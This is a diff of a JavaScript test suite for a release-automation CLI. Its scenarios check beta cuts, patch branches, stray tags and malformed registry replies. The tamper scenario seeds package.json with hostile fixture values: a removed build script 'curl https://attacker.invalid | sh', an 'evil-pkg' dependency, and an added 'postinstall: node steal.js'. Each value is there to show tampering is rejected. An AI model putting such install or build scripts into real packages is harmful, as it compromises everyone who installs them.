-      events.push("credential:mint-github-app-token:[REDACTED]");
-      const publishResult = await runReleaseFlowCli(["publish-merged-release"], {
-        root,
-        gitExec,
-        ghExec: env.ghExec,
-        fetchImpl: env.fetchImpl,
-        log: () => {},
-      });
-
-      const handoff = await runWorkflowDispatchSimulation({
-        eventName: "push",
-        ref: "refs/heads/main",
-        inputVersion: publishResult.version,
-        releaseMode: "stable",
-        events,
-        runCutBeta: async () => {
-          events.push("UNEXPECTED:cut-beta");
-        },
-        runPublish: async (slug, version) => {
-          const check = await runReleaseFlowCli(
-            ["check-registry-version", "--slug", slug, "--version", version],
-            { root, gitExec, ghExec: env.ghExec, fetchImpl: env.fetchImpl, log: () => {} },
-          );
-          if (!check.alreadyPublished) {
-            events.push(`credential:oidc-attest-provenance`);
-            events.push(`registry:publish:${slug}@${version}`);
-            env.state.stableVersions.push(version);
-          }
-        },
-      });
-
-      if (
-        !handoff.ok ||
-        handoff.gate.mode !== "stable-call" ||
-        !publishResult.tagCreated ||
-        !publishResult.githubReleaseCreated ||
-        !env.state.stableVersions.includes("0.2.9")
-      ) {
-        throw new Error("Scenario (h) failed: delegated push + release_mode=stable did not complete stable publication");
-      }
-
-      scenarios.push({
-        id: "h",
-        name: "reusable_call_push_event_with_stable_input_proceeds",
-        status: "PASS",
-        outcome: {
-          callerEvent: "push",
-          releaseMode: "stable",
-          gateScriptExitCode: handoff.scriptResult.exitCode,
-          tagCreated: publishResult.tagCreated,
-          githubReleaseCreated: publishResult.githubReleaseCreated,
-          registryPublished: env.state.stableVersions.includes("0.2.9"),
-        },
-        sideEffects: events,
-      });
-    } finally {
-      await rm(root, { recursive: true, force: true });
-    }
-  }
-
-  // Scenario (i): Manual workflow_dispatch attempting stable version OR passing release_mode=stable by hand is rejected before credentials/Registry I/O
-  {
-    const events = [];
-    const attemptStableVersion = await runWorkflowDispatchSimulation({
-      eventName: "workflow_dispatch",
-      ref: "refs/heads/main",
-      inputVersion: "0.2.9",
-      releaseMode: "beta",
-      events,
-      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
-      runPublish: async () => events.push("UNEXPECTED:publish"),
-    });
-    const attemptStableModeSpoof = await runWorkflowDispatchSimulation({
-      eventName: "workflow_dispatch",
-      ref: "refs/heads/main",
-      inputVersion: "0.2.9",
-      releaseMode: "stable",
-      events,
-      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
-      runPublish: async () => events.push("UNEXPECTED:publish"),
-    });
-    const touchedCredsOrRegistry = events.some(
-      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:") || e.startsWith("UNEXPECTED:"),
+    const promoteError = await captureError(() =>
+      runReleaseFlowCli(["promote", "--beta-version", cut.version, "--proof-ref", proofRef], cliDeps(root, gitExec, env)),
     );
-    if (attemptStableVersion.ok || attemptStableModeSpoof.ok || touchedCredsOrRegistry) {
-      throw new Error("Scenario (i) failed: manual workflow_dispatch stable spoof was not rejected");
+    git(["checkout", "-q", "-f", "main"], root);
+    events.length = 0;
+    const tagError = await captureError(() => runReleaseFlowCli(["publish-merged-release"], cliDeps(root, gitExec, env)));
+    const sideEffects = events.filter(SIDE_EFFECT);
+    if (!promoteError?.includes("has moved past") || !tagError?.includes("has moved past") || sideEffects.length > 0) {
+      throw new Error(`Scenario (d) failed: ${JSON.stringify({ promoteError, tagError, sideEffects })}`);
     }
+    scenarios.push({
+      id: "d",
+      name: "untested_change_on_release_branch_rejected_before_tagging",
+      status: "PASS",
+      outcome: { promoteError, tagError, stableSideEffectsCount: 0 },
+      sideEffects: events,
+    });
+  });
 
+  // Scenario (e): a merge run (here a merge commit, not a squash) that committed the release onto
+  // the branch but stopped before the tag resumes from that commit; a run after the tag exists does nothing (the tag's own run publishes).
+  await withSeededRepo("resume", async ({ events, root, gitExec }) => {
+    const env = createStubEnvironment({ events });
+    const cut = await runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env));
+    env.state.betaVersions.push(cut.version);
+    await runReleaseFlowCli(
+      ["promote", "--beta-version", cut.version, "--proof-ref", `run-703 (${cut.version} @running pass)`],
+      cliDeps(root, gitExec, env),
+    );
+    const mergeSha = mergeCommitReleasePr(root);
+    const failingTag = (args, cwd) => {
+      if (args[0] === "tag" && args[1] === "v0.2.9") throw new Error("simulated runner loss before tagging");
+      return gitExec(args, cwd);
+    };
+    const firstError = await captureError(() => runReleaseFlowCli(["publish-merged-release"], { ...cliDeps(root, failingTag, env) }));
+    git(["checkout", "-q", "-f", mergeSha], root);
+    const resumed = await runReleaseFlowCli(["publish-merged-release"], cliDeps(root, gitExec, env));
+    const again = await runReleaseFlowCli(["publish-merged-release"], cliDeps(root, gitExec, env));
+    const stableRun = await runTagRun({ root, gitExec, env, events, tag: "v0.2.9" });
+    if (!firstError || !resumed.tagPushed || !resumed.resumed || again.tagPushed || again.reason !== "tag_already_exists" || !env.state.stableVersions.includes("0.2.9") || !stableRun.checked.githubReleaseCreated) {
+      throw new Error(`Scenario (e) failed: ${JSON.stringify({ firstError, resumed, again })}`);
+    }
+    scenarios.push({
+      id: "e",
+      name: "interrupted_merge_run_resumes_from_its_release_commit",
+      status: "PASS",
+      outcome: { firstError, resumed: resumed.resumed, secondRun: again.reason, stablePublished: true },
+      sideEffects: events,
+    });
+  });
+
+  // Scenario (f): a Registry lookup failure stops Cut beta before any branch or tag.
+  await withSeededRepo("registry-failure", async ({ events, root, gitExec }) => {
+    const errors = [];
+    for (const registryError of [{ type: "network", message: "socket hang up" }, { status: 503 }]) {
+      const env = createStubEnvironment({ events, registryError });
+      errors.push(await captureError(() => runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env))));
+    }
+    const branches = git(["branch", "--list", "release/*"], root);
+    const sideEffects = events.filter(SIDE_EFFECT);
+    if (errors.some((error) => !error) || branches || sideEffects.length > 0) {
+      throw new Error(`Scenario (f) failed: ${JSON.stringify({ errors, branches, sideEffects })}`);
+    }
+    scenarios.push({
+      id: "f",
+      name: "registry_lookup_failure_aborts_cut_beta_before_branch_or_tag",
+      status: "PASS",
+      outcome: { errors, releaseBranchesCreated: 0 },
+      sideEffects: events,
+    });
+  });
+
+  // Scenario (g): an empty changeset passes the PR check and makes no bump; with only empty
+  // changesets pending, Cut beta refuses (nothing to give a store).
+  await withSeededRepo("empty-changeset", async ({ events, root, gitExec }) => {
+    const env = createStubEnvironment({ events });
+    await commitOnMain(root, { ".changeset/add-feature.md": null, ".changeset/docs-only.md": "---\n---\n\nDocs only.\n" }, "docs: only");
+    const emptyOnlyError = await captureError(() => runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env)));
+    await commitOnMain(root, { ".changeset/add-feature.md": FIX_CHANGESET }, "fix: shipping total");
+    git(["checkout", "-q", "-b", "feat/docs-plus-fix", "HEAD~1"], root);
+    await writeFile(join(root, ".changeset/empty-note.md"), "---\n---\n\nNotes only.\n", "utf8");
+    git(["add", "-A"], root);
+    git(["commit", "-q", "-m", "docs: notes"], root);
+    const prCheck = await runReleaseFlowCli(
+      ["check-pr", "--base", "main", "--head", "feat/docs-plus-fix", "--title", "docs: notes"],
+      {
+        ...cliDeps(root, (args, cwd) => (args[0] === "diff" && String(args[3]).startsWith("origin/") ? gitExec([args[0], args[1], args[2], args[3].replace("origin/", "")], cwd) : gitExec(args, cwd)), env),
+      },
+    );
+    git(["checkout", "-q", "-f", "main"], root);
+    const cut = await runReleaseFlowCli(["plan-beta"], cliDeps(root, gitExec, env));
+    if (!emptyOnlyError?.includes("nothing version-bumping") || prCheck.changesetFiles.length !== 1 || cut.version !== "0.2.9-beta.1" || cut.changesetCount !== 1) {
+      throw new Error(`Scenario (g) failed: ${JSON.stringify({ emptyOnlyError, prCheck, cut })}`);
+    }
+    scenarios.push({
+      id: "g",
+      name: "empty_changesets_make_no_bump_and_no_beta",
+      status: "PASS",
+      outcome: { emptyOnlyError, prCheckFiles: prCheck.changesetFiles, plannedBeta: cut.version, versionBumpingChangesetCount: cut.changesetCount },
+      sideEffects: events,
+    });
+  });
+
+  // Scenario (h): Add fix to beta copies a merged main commit onto the branch and tags beta.2. A
+  // commit that is not on main, one already on the branch, and one that does not copy cleanly are
+  // refused with nothing pushed.
+  await withSeededRepo("add-fix", async ({ events, root, gitExec }) => {
+    const env = createStubEnvironment({ events });
+    const cut = await runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env));
+    env.state.betaVersions.push(cut.version);
+    const fixSha = await commitOnMain(root, { ".changeset/shipping-total.md": FIX_CHANGESET, "src/plugin.ts": `export const pluginVersion = "0.2.9";\n` }, "fix: keep the shipping total");
+    const added = await runReleaseFlowCli(["add-fix", "--release-version", "0.2.9", "--commit", fixSha], cliDeps(root, gitExec, env));
+
+    git(["checkout", "-q", "-b", "unmerged", "main"], root);
+    await writeFile(join(root, "src/unmerged.ts"), "export const x = 1;\n", "utf8");
+    git(["add", "-A"], root);
+    git(["commit", "-q", "-m", "unmerged"], root);
+    const unmergedSha = git(["rev-parse", "HEAD"], root);
+    git(["checkout", "-q", "-f", "main"], root);
+    const conflictSha = await commitOnMain(root, { "src/plugin.ts": `export const pluginVersion = "conflict";\n` }, "refactor: plugin version");
+    git(["checkout", "-q", "-f", "release/0.2.9"], root);
+    await writeFile(join(root, "src/plugin.ts"), `export const pluginVersion = "branch-only";\n`, "utf8");
+    git(["commit", "-q", "-am", "branch-only edit"], root);
+    git(["checkout", "-q", "-f", "main"], root);
+
+    events.length = 0;
+    const unmergedError = await captureError(() => runReleaseFlowCli(["add-fix", "--release-version", "0.2.9", "--commit", unmergedSha], cliDeps(root, gitExec, env)));
+    const duplicateError = await captureError(() => runReleaseFlowCli(["add-fix", "--release-version", "0.2.9", "--commit", fixSha], cliDeps(root, gitExec, env)));
+    const conflictError = await captureError(() => runReleaseFlowCli(["add-fix", "--release-version", "0.2.9", "--commit", conflictSha], cliDeps(root, gitExec, env)));
+    const sideEffects = events.filter(SIDE_EFFECT);
+    const pickedMessage = git(["log", "-1", "--format=%B", added.betaSha], root);
+    if (
+      added.version !== "0.2.9-beta.2" ||
+      !pickedMessage.includes(`(cherry picked from commit ${fixSha})`) ||
+      !unmergedError?.includes("is not a commit on main") ||
+      !duplicateError?.includes("already on release/0.2.9") ||
+      !conflictError?.includes("does not copy cleanly") ||
+      sideEffects.length > 0
+    ) {
+      throw new Error(`Scenario (h) failed: ${JSON.stringify({ added, unmergedError, duplicateError, conflictError, sideEffects })}`);
+    }
+    scenarios.push({
+      id: "h",
+      name: "add_fix_copies_only_merged_main_commits_and_tags_next_beta",
+      status: "PASS",
+      outcome: { betaVersion: added.version, cherryPickRecorded: true, unmergedError, duplicateError, conflictError },
+      sideEffects: events,
+    });
+  });
+
+  // Scenario (i): a fix for a released version goes on a patch branch made from its tag; a patch
+  // branch whose changesets would make a minor release is refused at Promote.
+  await withSeededRepo("patch-branch", async ({ events, root, gitExec }) => {
+    const env = createStubEnvironment({ events });
+    const cut = await runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env));
+    env.state.betaVersions.push(cut.version);
+    await runReleaseFlowCli(["promote", "--beta-version", cut.version, "--proof-ref", `run-709 (${cut.version} @running pass)`], cliDeps(root, gitExec, env));
+    squashMergeReleasePr(root);
+    await runReleaseFlowCli(["publish-merged-release"], cliDeps(root, gitExec, env));
+
+    const releasedError = await captureError(async () => {
+      const sha = await commitOnMain(root, { ".changeset/late.md": FIX_CHANGESET, "src/late.ts": "export const late = 1;\n" }, "fix: late");
+      await runReleaseFlowCli(["add-fix", "--release-version", "0.2.9", "--commit", sha], cliDeps(root, gitExec, env));
+    });
+    const lateSha = git(["rev-parse", "main"], root);
+    const patch = await runReleaseFlowCli(["add-fix", "--release-version", "0.2.10", "--commit", lateSha], cliDeps(root, gitExec, env));
+    env.state.betaVersions.push(patch.version);
+    const patchBaseSha = git(["rev-list", "-n", "1", "v0.2.9"], root);
+    const branchParent = git(["rev-parse", `${patch.betaSha}^`], root);
+
+    const minorSha = await commitOnMain(root, { ".changeset/minor.md": FEATURE_CHANGESET, "src/minor.ts": "export const minor = 1;\n" }, "feat: minor");
+    const minorBeta = await runReleaseFlowCli(["add-fix", "--release-version", "0.2.10", "--commit", minorSha], cliDeps(root, gitExec, env));
+    env.state.betaVersions.push(minorBeta.version);
+    const minorPromoteError = await captureError(() =>
+      runReleaseFlowCli(["promote", "--beta-version", minorBeta.version, "--proof-ref", `run-710 (${minorBeta.version} @running pass)`], cliDeps(root, gitExec, env)),
+    );
+    if (
+      !releasedError?.includes("already released") ||
+      patch.version !== "0.2.10-beta.1" ||
+      patch.patchBase !== "v0.2.9" ||
+      branchParent !== patchBaseSha ||
+      !minorPromoteError?.includes("make 0.3.0, not 0.2.10")
+    ) {
+      throw new Error(`Scenario (i) failed: ${JSON.stringify({ releasedError, patch, branchParent, patchBaseSha, minorPromoteError })}`);
+    }
     scenarios.push({
       id: "i",
-      name: "manual_workflow_dispatch_stable_version_or_mode_rejected_before_credentials",
+      name: "released_version_fix_uses_patch_branch_from_its_tag",
       status: "PASS",
-      outcome: {
-        stableVersionRejectedCode: attemptStableVersion.gate.code,
-        stableModeSpoofRejectedCode: attemptStableModeSpoof.gate.code,
-        scriptExitCodes: [
-          attemptStableVersion.scriptResult.exitCode,
-          attemptStableModeSpoof.scriptResult.exitCode,
-        ],
-        credentialOrRegistryIoCount: 0,
-      },
+      outcome: { releasedError, patchBeta: patch.version, patchBase: patch.patchBase, minorPromoteError },
       sideEffects: events,
     });
-  }
+  });
 
-  // Scenario (j): Push event WITHOUT stable caller input and push on a non-main ref are both rejected before credentials/Registry I/O
-  {
-    const events = [];
-    const pushWithoutInput = await runWorkflowDispatchSimulation({
-      eventName: "push",
-      ref: "refs/heads/main",
-      inputVersion: "0.2.9",
-      releaseMode: "",
-      events,
-      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
-      runPublish: async () => events.push("UNEXPECTED:publish"),
-    });
-    const pushOnNonMain = await runWorkflowDispatchSimulation({
-      eventName: "push",
-      ref: "refs/heads/feat/rogue-push",
-      inputVersion: "0.2.9",
-      releaseMode: "stable",
-      events,
-      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
-      runPublish: async () => events.push("UNEXPECTED:publish"),
-    });
-    const touchedCredsOrRegistry = events.some(
-      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:") || e.startsWith("UNEXPECTED:"),
-    );
-    if (pushWithoutInput.ok || pushOnNonMain.ok || touchedCredsOrRegistry) {
-      throw new Error("Scenario (j) failed: push without stable caller input or non-main ref was not rejected");
+  // Scenario (j): a version tag that is not on its release branch is refused before the Registry
+  // job, and a tag run with the wrong release_mode or version never publishes.
+  await withSeededRepo("stray-tag", async ({ events, root, gitExec }) => {
+    const env = createStubEnvironment({ events });
+    git(["tag", "v0.2.9-beta.1", "main"], root);
+    const strayError = await captureError(() => runReleaseFlowCli(["verify-release-tag", "--ref", "refs/tags/v0.2.9-beta.1"], cliDeps(root, gitExec, env)));
+    const mismatches = [];
+    for (const item of [
+      { ref: "refs/tags/v0.2.9-beta.1", inputVersion: "0.2.9-beta.1", releaseMode: "stable" },
+      { ref: "refs/tags/v0.2.9", inputVersion: "0.2.9", releaseMode: "beta" },
+      { ref: "refs/tags/v0.2.9", inputVersion: "0.2.10", releaseMode: "stable" },
+    ]) {
+      mismatches.push(
+        await runRegistryJobSimulation({ eventName: "push", ...item, events, runPublish: async () => events.push("UNEXPECTED:publish") }),
+      );
     }
-
+    if (!strayError?.includes("is not a commit on release/0.2.9") || mismatches.some((res) => res.ok) || events.some((e) => e.startsWith("UNEXPECTED:"))) {
+      throw new Error(`Scenario (j) failed: ${JSON.stringify({ strayError, codes: mismatches.map((res) => res.gate.code) })}`);
+    }
     scenarios.push({
       id: "j",
-      name: "push_without_stable_caller_input_and_non_main_ref_rejected",
+      name: "stray_tag_and_mismatched_tag_runs_rejected",
       status: "PASS",
-      outcome: {
-        pushWithoutInputCode: pushWithoutInput.gate.code,
-        pushOnNonMainCode: pushOnNonMain.gate.code,
-        scriptExitCodes: [
-          pushWithoutInput.scriptResult.exitCode,
-          pushOnNonMain.scriptResult.exitCode,
-        ],
-        credentialOrRegistryIoCount: 0,
-      },
+      outcome: { strayError, codes: mismatches.map((res) => res.gate.code) },
       sideEffects: events,
+    });
+  });
+
+  // Scenario (k): a stable tag whose commit changes a dependency, a script, or the lockfile beyond
+  // the version is refused by the tag run before its GitHub Release. (Payments' manifest carries no
+  // version, so any manifest change is outside the release files.)
+  {
+    const variants = {
+      dependency: (pkg) => ({ ...pkg, dependencies: { ...pkg.dependencies, stripe: "24.0.0" } }),
+      script: (pkg) => ({ ...pkg, scripts: { ...pkg.scripts, postinstall: "node steal.js" } }),
+    };
+    const errors = {};
+    for (const [label, edit] of Object.entries({ ...variants, lockfile: null })) {
+      await withSeededRepo(`tampered-${label}`, async ({ events, root, gitExec }) => {
+        const env = createStubEnvironment({ events });
+        const cut = await runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env));
+        env.state.betaVersions.push(cut.version);
+        await runReleaseFlowCli(["promote", "--beta-version", cut.version, "--proof-ref", `run-711 (${cut.version} @running pass)`], cliDeps(root, gitExec, env));
+        squashMergeReleasePr(root);
+        const done = await runReleaseFlowCli(["publish-merged-release"], cliDeps(root, gitExec, env));
+
+        git(["checkout", "-q", "-f", "release/0.2.9"], root);
+        if (edit) {
+          const pkg = JSON.parse(await readFile(join(root, "package.json"), "utf8"));
+          await writeFile(join(root, "package.json"), `${JSON.stringify(edit(pkg), null, 2)}\n`, "utf8");
+        } else if (label === "lockfile") {
+          const lock = JSON.parse(await readFile(join(root, "package-lock.json"), "utf8"));
+          lock.packages["node_modules/stripe"].version = "24.0.0";
+          await writeFile(join(root, "package-lock.json"), `${JSON.stringify(lock, null, 2)}\n`, "utf8");
+        } else {
+          const manifest = JSON.parse(await readFile(join(root, "emdash-plugin.jsonc"), "utf8"));
+          manifest.capabilities = [...manifest.capabilities, "email:send"];
+          await writeFile(join(root, "emdash-plugin.jsonc"), `${JSON.stringify(manifest, null, 2)}\n`, "utf8");
+        }
+        const message = git(["log", "-1", "--format=%B"], root);
+        git(["commit", "-q", "-a", "--amend", "-m", message], root);
+        git(["tag", "-f", done.tag, "HEAD"], root);
+        events.length = 0;
+        errors[label] = await captureError(() => runTagRun({ root, gitExec, env, events, tag: done.tag }));
+        if (events.filter(SIDE_EFFECT).length > 0) errors[label] = null;
+      });
+    }
+    if (Object.values(errors).some((error) => !error)) {
+      throw new Error(`Scenario (k) failed: ${JSON.stringify(errors)}`);
+    }
+    scenarios.push({
+      id: "k",
+      name: "dependency_script_and_lockfile_changes_on_stable_tag_rejected",
+      status: "PASS",
+      outcome: errors,
+      sideEffects: [],
     });
   }
 
-  // Scenario (k): Dependency change and script change in package.json / lockfile after beta approval rejected before tag
-  {
-    const events = [];
-    const { root, gitExec } = await createSeededRepo("tampered-pkg-metadata", events);
-    try {
-      const env = createStubEnvironment({ events, betaVersions: [] });
-      const cut = await runReleaseFlowCli(["cut-beta"], {
-        root,
-        gitExec,
-        ghExec: env.ghExec,
-        fetchImpl: env.fetchImpl,
-        log: () => {},
+  // Scenario (l): a malformed Registry 200 (`{}`, an error-shaped object, a malformed entry) stops
+  // Cut beta before any branch or tag.
+  await withSeededRepo("malformed-registry", async ({ events, root, gitExec }) => {
+    const errors = {};
+    for (const item of [
+      { label: "empty_object", body: {} },
+      { label: "error_shaped_200", body: { error: "RateLimited", message: "try later" } },
+      { label: "malformed_version_entry", body: { records: [{ bad: true }] } },
+    ]) {
+      const env = createStubEnvironment({
+        events,
+        customRegistryResponse: () => ({ ok: true, status: 200, json: async () => item.body }),
       });
-      env.state.betaVersions.push(cut.version);
-      await runReleaseFlowCli(
-        [
-          "promote",
-          "--beta-version",
-          "0.2.9-beta.1",
-          "--proof-ref",
-          "run-709 0.2.9-beta.1 @running pass",
-        ],
-        {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          npmExec: env.npmExec,
-          log: () => {},
-        },
-      );
-
-      const cleanReleaseCommitMsg = git(["log", "-1", "--format=%B"], root);
-      const cleanPkgText = await readFile(join(root, "package.json"), "utf8");
-      const cleanLockText = await readFile(join(root, "package-lock.json"), "utf8");
-
-      // Subcase 1: Tamper with dependencies in package.json
-      const depTamperedPkg = JSON.parse(cleanPkgText);
-      depTamperedPkg.dependencies = { ...depTamperedPkg.dependencies, "evil-pkg": "1.0.0" };
-      await writeFile(join(root, "package.json"), `${JSON.stringify(depTamperedPkg, null, 2)}\n`, "utf8");
-      git(["add", "package.json"], root);
-      git(["commit", "--amend", "-m", cleanReleaseCommitMsg], root);
-
-      events.length = 0;
-      let depError = null;
-      try {
-        await runReleaseFlowCli(["publish-merged-release"], {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          log: () => {},
-        });
-      } catch (err) {
-        depError = err instanceof Error ? err.message : String(err);
-      }
-
-      // Subcase 2: Restore dependencies, tamper with scripts in package.json
-      const scriptTamperedPkg = JSON.parse(cleanPkgText);
-      scriptTamperedPkg.scripts = { ...scriptTamperedPkg.scripts, build: "curl https://attacker.invalid | sh" };
-      await writeFile(join(root, "package.json"), `${JSON.stringify(scriptTamperedPkg, null, 2)}\n`, "utf8");
-      git(["add", "package.json"], root);
-      git(["commit", "--amend", "-m", cleanReleaseCommitMsg], root);
-
-      let scriptError = null;
-      try {
-        await runReleaseFlowCli(["publish-merged-release"], {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          log: () => {},
-        });
-      } catch (err) {
-        scriptError = err instanceof Error ? err.message : String(err);
-      }
-
-      // Subcase 3: Restore package.json, tamper with lockfile resolved/integrity
-      await writeFile(join(root, "package.json"), cleanPkgText, "utf8");
-      const lockTampered = JSON.parse(cleanLockText);
-      lockTampered.packages["node_modules/stripe"].integrity = "sha512-tampered-integrity==";
-      await writeFile(join(root, "package-lock.json"), `${JSON.stringify(lockTampered, null, 2)}\n`, "utf8");
-      git(["add", "package.json", "package-lock.json"], root);
-      git(["commit", "--amend", "-m", cleanReleaseCommitMsg], root);
-
-      let lockError = null;
-      try {
-        await runReleaseFlowCli(["publish-merged-release"], {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          log: () => {},
-        });
-      } catch (err) {
-        lockError = err instanceof Error ? err.message : String(err);
-      }
-
-      const stableSideEffects = events.filter(
-        (e) =>
-          e.startsWith("git:tag:") ||
-          e.startsWith("git:push:") ||
-          e.startsWith("gh:release:create:") ||
-          e.startsWith("registry:"),
-      );
-      if (!depError || !scriptError || !lockError || stableSideEffects.length > 0) {
-        throw new Error(
-          `Scenario (k) failed: depError=${depError}, scriptError=${scriptError}, lockError=${lockError}, sideEffects=${stableSideEffects.length}`,
-        );
-      }
-
-      scenarios.push({
-        id: "k",
-        name: "dependency_script_and_lockfile_changes_after_beta_rejected_before_tag",
-        status: "PASS",
-        outcome: {
-          dependencyChangeRejected: depError,
-          scriptChangeRejected: scriptError,
-          lockfileIntegrityChangeRejected: lockError,
-          stableSideEffectsCount: stableSideEffects.length,
-        },
-        sideEffects: events,
-      });
-    } finally {
-      await rm(root, { recursive: true, force: true });
+      errors[item.label] = await captureError(() => runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env)));
     }
-  }
-
-  // Scenario (l): Malformed Registry 200 (`{}`, error-shaped object, malformed entry) aborts cut-beta before tag
-  {
-    const events = [];
-    const { root, gitExec } = await createSeededRepo("malformed-registry-200", events);
-    try {
-      const payloads = [
-        { label: "empty_object", body: {} },
-        { label: "error_shaped_200", body: { error: "RateLimited", message: "try later" } },
-        { label: "malformed_version_entry", body: { records: [{ bad: true }] } },
-      ];
-      const errors = {};
-
-      for (const item of payloads) {
-        const env = createStubEnvironment({
-          events,
-          customRegistryResponse: () => ({
-            ok: true,
-            status: 200,
-            json: async () => item.body,
-          }),
-        });
-        try {
-          await runReleaseFlowCli(["cut-beta"], {
-            root,
-            gitExec,
-            ghExec: env.ghExec,
-            fetchImpl: env.fetchImpl,
-            log: () => {},
-          });
-        } catch (err) {
-          errors[item.label] = err instanceof Error ? err.message : String(err);
-        }
-      }
-
-      const betaTags = git(["tag", "--list", "v0.2.9-beta.*"], root)
-        .split("\n")
-        .filter(Boolean);
-      const anyTagSideEffect = events.some((e) => e.startsWith("git:tag:") || e.startsWith("git:push:"));
-      if (
-        !errors.empty_object ||
-        !errors.error_shaped_200 ||
-        !errors.malformed_version_entry ||
-        betaTags.length > 0 ||
-        anyTagSideEffect
-      ) {
-        throw new Error(
-          `Scenario (l) failed: errors=${JSON.stringify(errors)}, betaTags=${betaTags.length}`,
-        );
-      }
-
-      scenarios.push({
-        id: "l",
-        name: "malformed_registry_200_responses_abort_cut_beta_before_tag",
-        status: "PASS",
-        outcome: {
-          emptyObjectError: errors.empty_object,
-          errorShaped200Error: errors.error_shaped_200,
-          malformedEntryError: errors.malformed_version_entry,
-          betaTagsCreated: betaTags.length,
-        },
-        sideEffects: events,
-      });
-    } finally {
-      await rm(root, { recursive: true, force: true });
+    const betaTags = git(["tag", "--list", "v0.2.9-beta.*"], root).split("\n").filter(Boolean);
+    const branches = git(["branch", "--list", "release/*"], root);
+    if (Object.values(errors).some((error) => !error) || betaTags.length > 0 || branches || events.some(SIDE_EFFECT)) {
+      throw new Error(`Scenario (l) failed: ${JSON.stringify({ errors, betaTags, branches })}`);
     }
-  }
+    scenarios.push({
+      id: "l",
+      name: "malformed_registry_200_responses_abort_cut_beta_before_branch_or_tag",
+      status: "PASS",
+      outcome: { ...errors, betaTagsCreated: 0 },
+      sideEffects: events,
+    });
+  });
 
   return {
     proof: "release-authority-proof",
